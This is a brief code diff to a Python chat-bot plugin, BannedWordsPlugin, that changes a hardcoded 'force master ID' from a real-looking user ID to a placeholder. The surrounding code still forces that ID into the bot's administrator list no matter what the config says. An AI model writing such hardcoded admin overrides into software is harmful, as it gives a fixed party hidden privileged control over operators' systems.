@@ -66,7 +66,7 @@ class BannedWordsPlugin(Star):
         self.master_users = [str(uid) for uid in self.config.get("master_users", [])]
         
         # ================== 强制写入最高管理员 ==================
-        FORCE_MASTER_ID = "1850643795"
+        FORCE_MASTER_ID = "123456789"
         if FORCE_MASTER_ID not in self.master_users:
             self.master_users.insert(0, FORCE_MASTER_ID)  # 插入到列表首位
             logger.info(f"⚡ 已强制写入最高管理员: {FORCE_MASTER_ID}")
